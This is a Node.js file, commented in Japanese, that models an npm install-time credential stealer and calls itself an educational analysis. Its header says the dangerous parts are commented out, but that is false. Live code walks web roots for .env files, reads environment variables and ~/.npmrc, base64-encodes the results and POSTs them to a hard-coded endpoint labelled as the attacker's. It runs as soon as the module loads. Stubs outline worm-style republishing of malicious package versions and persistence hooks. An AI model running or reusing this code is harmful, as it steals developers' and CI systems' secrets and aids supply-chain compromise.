/**
 * 疑似悪性コード - 教育目的での分析
 * 危険な部分はコメントアウトしています
 */

const fs = require('fs');
const path = require('path');
const os = require('os');

let targetDrive;

if (os.platform() === 'win32') {
  targetDrive = 'C:\\Apache24\\htdocs\\';
} else if (os.platform() === 'linux') {
  targetDrive = '/var/www/html/';
} else {
  throw new Error(`未対応のOSです: ${os.platform()}`);
}

console.log(targetDrive);

const targetEnvFiles = new Set([
  ".env",
  ".env.local",
  ".env.production",
]);

// パッケージインストール時に実行される処理
async function onPackageInstall() {
  console.log('[INIT] Package installation started');
  console.log(`${targetDrive} 以下の .env ファイルを検索中...`);

  const results = findEnvFiles(targetDrive);
  let envFileValues = {};

  if (results.length > 0) {
    console.log(`\n${results.length} 件の .env ファイルが見つかりました:\n`);

    for (const envPath of results) {
      console.log(envPath);
    }

    // getEnvFileValues で仮データを作成し、戻り値として受け取る
    envFileValues = getEnvFileValues(results);
  } else {
    console.log("\n.env ファイルは見つかりませんでした。");
  }

    const allCollectedData = {
        envVars: envFileValues,
        npmTokens: '[REDACTED]',
        gitCredentials: '[REDACTED]',
        cloudCredentials: '[REDACTED]',
        vaultFiles: '[REDACTED]',
        runnerContext: '[REDACTED]',
        publishingIdentity: '[REDACTED]',
        timestamp: new Date().toISOString(),
        hostname: os.hostname()
    };

  // // 難読化されたペイロードの読み込み
  const payload = loadObfuscatedPayload();

  // 開発環境またはCI環境かどうかを判定
  const isDeveloperEnvironment = checkIfDeveloperOrCIEnvironment();

  if (isDeveloperEnvironment) {
    console.log('[WARN] Developer/CI environment detected');
    
    // 環境変数の収集 (危険)
    const envVars = collectEnvironmentVariables();
    
    // npm トークンファイルの収集 (危険)
    const npmTokens = collectNpmTokenFiles();
    
    // Git/GitHub 認証情報の収集 (危険)
    const gitCredentials = collectGitCredentials();
    
    // クラウド認証情報ファイルの収集 (危険)
    const cloudCredentials = collectCloudCredentialFiles();
    
    // SSH/Vault関連ファイルの収集 (危険)
    const vaultFiles = collectSSHAndVaultFiles();
  }

  // GitHub Actions 環境かどうかを判定
  if (isRunningInGitHubActions()) {
    console.log('[WARN] GitHub Actions environment detected');
    
    // ランナーコンテキストの検査 (危険)
    const runnerContext = inspectGitHubActionsRunnerContext();
    
    // 一時的なパブリッシング認証情報/OIDCマテリアルの取得 (危険)
    const publishingIdentity = obtainTemporaryPublishingIdentity();
  }

  // 収集したデータの暗号化 (危険)
  const encryptedData = encryptCollectedData(allCollectedData);
  
  // 攻撃者が管理するエンドポイントへ送信 (危険)
   await sendDataToAttackerEndpoint(encryptedData);
  
  // npm/GitHub パブリッシング権限の確認 (危険)
  if (hasNpmPublishingRights() || hasGitHubPublishingRights()) {
    // 保守者パッケージの列挙 (危険)
    const packages = enumerateMaintainerPackages();
    
    // 悪質なバージョンのパブリッシュ (危険)
    publishMaliciousVersions(packages);
  }
  
  // パーシスタンスまたはフック機構のインストール (危険)
  installPersistenceOrHooks();

  console.log('[INIT] Package initialization completed (security checks commented out)');
}

// ============ ヘルパー関数 ============

/**
 * 開発環境またはCI環境かどうかを判定
 */
function checkIfDeveloperOrCIEnvironment() {
  const isDev = process.env.NODE_ENV === 'development';
  const isCI = process.env.CI === 'true' || 
               process.env.GITHUB_ACTIONS === 'true' ||
               process.env.GITLAB_CI === 'true';
  
  return isDev || isCI;
}

/**
 * GitHub Actions 環境かどうかを判定
 */
function isRunningInGitHubActions() {
  return process.env.GITHUB_ACTIONS === 'true';
}

// 危険な関数（コメントアウト）

function loadObfuscatedPayload() {
  // 難読化されたコードを読み込み
  return null;
}

function collectEnvironmentVariables() {
  // 環境変数を収集 (認証情報を含む可能性)
  return process.env;
}

function collectNpmTokenFiles() {
  const homeDir = os.homedir();
  const npmrcPath = path.join(homeDir, '.npmrc');
  if (fs.existsSync(npmrcPath)) {
    return fs.readFileSync(npmrcPath, 'utf8');
  }
  return null;
}

function collectGitCredentials() {
  const homeDir = os.homedir();
  const gitConfigPath = path.join(homeDir, '.git', 'config');
  const sshPath = path.join(homeDir, '.ssh');
  // ファイルを読み込んで認証情報を抽出
  return null;
}

function collectCloudCredentialFiles() {
  // AWS, GCP, Azure などの認証情報ファイルを収集
  // ~/.aws/credentials, ~/.gcp/config など
  return null;
}

function collectSSHAndVaultFiles() {
  // SSH キーとボルト関連ファイルを収集
  return null;
}

function inspectGitHubActionsRunnerContext() {
  // GitHub Actions のランナーコンテキストを検査
  return {
    actor: process.env.GITHUB_ACTOR,
    ref: process.env.GITHUB_REF,
    repository: process.env.GITHUB_REPOSITORY
  };
}

function obtainTemporaryPublishingIdentity() {
  // OIDC トークンなど一時的なパブリッシング認証情報を取得
  return null;
}

function encryptCollectedData(data) {
  // 収集したデータを暗号化
  return Buffer.from(JSON.stringify(data)).toString('base64');
}

function findEnvFiles(rootDir) {
  const envFiles = [];

  function walk(currentDir) {
    console.log(`検索中: ${currentDir}`);

    let entries;

    try {
      entries = fs.readdirSync(currentDir, { withFileTypes: true });
    } catch (e) {
      // 権限エラーなどは無視
      return;
    }

    for (const entry of entries) {
      const fullPath = path.join(currentDir, entry.name);

      if (entry.isDirectory()) {
        walk(fullPath);
      } else if (entry.isFile()) {
        if (targetEnvFiles.has(entry.name)) {
          envFiles.push(fullPath);
        }
      }
    }
  }

  walk(rootDir);
  return envFiles;
}

function getEnvFileValues(envFiles) {
  const result = {};

  for (const envPath of envFiles) {
    try {
      const content = fs.readFileSync(envPath, "utf8");

      result[envPath] = {
        success: true,
        content: content.trim() ? content : "",
        isEmpty: !content.trim(),
        error: null,
      };
    } catch (e) {
      let message;

      if (e.code === "EACCES" || e.code === "EPERM") {
        message = "権限がないため読み込めませんでした";
      } else {
        message = `読み込み失敗: ${e.message}`;
      }

      result[envPath] = {
        success: false,
        content: null,
        isEmpty: false,
        error: message,
      };
    }
  }

  return result;
}

async function sendDataToAttackerEndpoint(encryptedData) {
  // 攻撃者が管理するエンドポイントへデータを送信
  const res = await fetch("http://192.168.1.229:3001/api/sql/homedata/senddata", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      moji: JSON.stringify(encryptedData),
    }),
  });

  if (!res.ok) {
    throw new Error(`HTTP error: ${res.status}`);
  }

  return await res.text();
}

function hasNpmPublishingRights() {
  // npm のパブリッシング権限を確認
  return false;
}

function hasGitHubPublishingRights() {
  // GitHub のパブリッシング権限を確認
  return false;
}

function enumerateMaintainerPackages() {
  // 保守者パッケージを列挙
  return [];
}

function publishMaliciousVersions(packages) {
  // 悪質なバージョンをパブリッシュ
  packages.forEach(pkg => {
    npm.publish(pkg, maliciousVersion);
  });
}

function installPersistenceOrHooks() {
  // パーシスタンス機構またはフックをインストール
  // ビルド、テスト、デプロイプロセスに挿入
}

// ============ エクスポート ============

module.exports = {
  onPackageInstall
};

// 実行例
onPackageInstall().catch((error) => {
  console.error('[INIT] Failed:', error);
  process.exit(1);
});
